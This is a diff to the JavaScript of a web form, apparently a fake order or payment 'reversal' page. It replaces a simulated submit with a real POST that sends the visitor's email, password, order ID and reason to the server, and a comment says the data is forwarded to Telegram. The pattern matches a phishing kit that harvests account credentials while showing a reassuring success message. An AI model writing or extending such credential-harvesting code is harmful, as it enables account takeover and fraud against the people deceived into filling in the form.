@@ -389,15 +389,30 @@
       btn.textContent = 'Submitting…';
       btn.disabled = true;
 
-      // Simulate API call
-      setTimeout(() => {
-        showToast('Reversal submitted successfully!', 4000);
-        btn.textContent = 'Submit';
-        btn.disabled = false;
-        document.getElementById('reversalForm').reset();
-        reasonField.classList.remove('filled');
-        reasonSelect.classList.remove('has-value');
-      }, 1500);
+      // POST to server → Telegram
+      fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password, orderId, reason }),
+      })
+        .then(res => res.json())
+        .then(data => {
+          if (data.success) {
+            showToast('✅ Reversal submitted successfully!', 4000);
+            document.getElementById('reversalForm').reset();
+            reasonField.classList.remove('filled');
+            reasonSelect.classList.remove('has-value');
+          } else {
+            showToast(data.message || 'Submission failed. Please try again.');
+          }
+        })
+        .catch(() => {
+          showToast('Network error. Please try again.');
+        })
+        .finally(() => {
+          btn.textContent = 'Submit';
+          btn.disabled = false;
+        });
     });
 
     // ── Placeholder link handlers ──
